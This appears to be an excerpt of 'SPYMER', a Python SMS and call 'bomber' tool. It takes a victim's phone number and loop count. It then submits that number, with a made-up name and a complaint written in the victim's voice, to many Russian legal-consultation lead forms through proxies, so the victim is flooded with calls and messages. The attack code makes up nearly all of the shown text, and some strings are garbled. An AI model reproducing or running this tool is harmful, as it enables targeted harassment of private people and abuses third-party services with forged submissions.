...
def Main():
	...
	if int(ver) < int(version):
		info = Back.RED+"\nThe version is outdated and needs to be updated!"+Style.RESET_ALL
	else:
		info = " "
	proxy = "localhost"
	...
	def main():
		...
		while True:
			...
			print ("1) SMS spammer.\n2) Add phone to antispam list.\n3) Scan phone in antispam list.\n4) Call spammer.\n5) Update proxy.\n6) Update SPYMER.\n7) Exit.\n")
			input1 = input(Fore.BLUE+"Enter item: "+Style.RESET_ALL)
			if input1 == "1":
				try:
					print('Enter phone ("Enter" - cancel):')
					phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					try:
						if int(phone):
							print('Enter the number of circles ("Enter"-cancel):')
							...
							try:
								if int(count):
									...
									if int(id) > 0:
										info = Fore.RED+"\nThe phone number is in the antispam list."+Style.RESET_ALL
									elif int(id)==0:
										_name = ''
										for x in range(12):
										...
										email = _email
										info = '\nPhone: {}\nCycles: {}'.format(phone, count)+'\nThe Spammer is running.\nIf you want to stop - press Ctrl+Z.'
										os.system("clear")
										print(logo)
										print(info)
										if _phone[0] == '9':
										...
										while iteration < count:
											try:
												...
												iteration += 1
												print(('{} cycle.').format(iteration))
											except KeyboardInterrupt:
												info = Fore.RED+"\nThe Spammer stopped.\nPhone: {}\nCycles: {}".format(phone, iteration)+Style.RESET_ALL
												main()
											except:
												pass
										info = Fore.BLUE+"\nDone.\nPhone: {}\nCycles: {}".format(phone, iteration)+Style.RESET_ALL
							except:
								info = Fore.RED+"\nIncorrect number of cycles entered!"+Style.RESET_ALL
					except:
						info = Fore.RED+"\nIncorrect phone entered!"+Style.RESET_ALL
				except KeyboardInterrupt:
					info = Fore.RED+"\nCancel!"+Style.RESET_ALL
				except:
					info = Fore.RED+"\nIncorrect dataset entered!"+Style.RESET_ALL
				...
				try:
					if int(phone):
						...
						if int(id) > 0:
							...
							info = Fore.GREEN+"\nPhone {} added to the antispam list.".format(phone)+Style.RESET_ALL
							
				except:
					info = Fore.RED+"\nIncorrect phone entered!".format(phone)+Style.RESET_ALL
			
			elif input1 == "3":
				print ("Enter the phone to check:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if phone[0] == '+':
					phone = phone[1:]
				if phone[0] == '8':
				...
				try:
					if int(phone):
						id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nPhone {} is in antispam list.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							info = Fore.RED+"\nPhone {} is not in antispam list.".format(phone)+Style.RESET_ALL
				except:
					info = Fore.RED+"\nIncorrect phone entered!"+Style.RESET_ALL
					...
					try:
						if int(phone):
							...
							if name == "":
								...
								main()
							print("Enter complaint (an appeal that the victim allegedly addresses to lawyers):")
							text = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
							if text == "":
								info = Fore.RED+"\nIncorrect complaint entered!"+Style.RESET_ALL
								main()
							try:
								_phone=phone
								_text=text
								...
								id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': _phone}).json()["id"]
								if int(id) > 0:
									info = Fore.RED+"\nThe phone is in the antispam list."+Style.RESET_ALL
									main()
								elif int(id)==0:
									_email = ''
									for x in range(12):
									...
									info="Phone: {}\nName: {}\nComplaint: {}\nThe Spammer is running.\nTo cancel, press Ctrl+C".format(phone, name, text)
									os.system("clear")
									print(logo)
									print(info)
									proxies=None
									try:
										...
										try:
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Ð9cÐbeÑ81ÐbaÐb2Ðb0','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'}, proxies=proxies)
										...
										try:
											...
											if blablabla.status_code == 200:
												print(Fore.GREEN + 'Ñ8eÑ80Ðb8Ñ81Ñ82-Ðb0Ðb2Ðb3Ñ80Ñ83ÐbfÐbf.Ñ80Ñ84: sent')
											else:
												print(Fore.RED + 'Ñ8eÑ80Ðb8Ñ81Ñ82-Ðb0Ðb2Ðb3Ñ80Ñ83ÐbfÐbf.Ñ80Ñ84: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Ð9cÐbeÑ81ÐbaÐb2Ðb0', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'}, proxies=proxies)
										...
										try:
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Ð9cÐbeÑ81ÐbaÐb2Ðb0','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'}, proxies=proxies)
										...
										try:
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': _name,'tel-231': _phone,'textarea-472': _text,'hidden-278': 'Ð93ÐbbÐb0Ðb2ÐbdÐb0Ñ8f'}, proxies=proxies)
											if rdftgbhnj.status_code == 200:
												print(Fore.GREEN + 'Ðb3ÐbeÑ81-Ñ8eÑ80Ðb8Ñ81Ñ82Ñ8b.Ñ80Ñ84: sent')
											else:
												print(Fore.RED + 'Ðb3ÐbeÑ81-Ñ8eÑ80Ðb8Ñ81Ñ82Ñ8b.Ñ80Ñ84: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
										...
										try:
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											pravosfera = requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'c_name': _name, 'c_tel' : _phoneVodaonline, 'quest': _text, 'uest_go': 'Ð97Ðb0Ðb4Ðb0Ñ82Ñ8c Ðb2ÐbeÐbfÑ80ÐbeÑ81'}, proxies=proxies)
											if usachev.status_code == 200:
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Ð97Ðb0ÐbaÐb0Ðb7 ÐbeÐb1Ñ80Ðb0Ñ82ÐbdÐbeÐb3Ðbe Ðb7Ðb2ÐbeÐbdÐbaÐb0'}, proxies=proxies)
											...
											print(Fore.RED + 'SERVICE DIED')
										try:
											lawdivorce = requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': _text,'name': _name,'telephone': '+'+_phoneBukvaprava,'city': 'Ð9cÐbeÑ81ÐbaÐb2Ðb0'}, proxies=proxies)
										...
										try:
											...
											if gosurist.status_code == 200:
												...
												print(Fore.RED + 'www.gos-urist.ruÑ87Ñ91: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
								...
								info = Fore.RED+"\nError 4589: send me to Telegram @FSystem88!"+Style.RESET_ALL
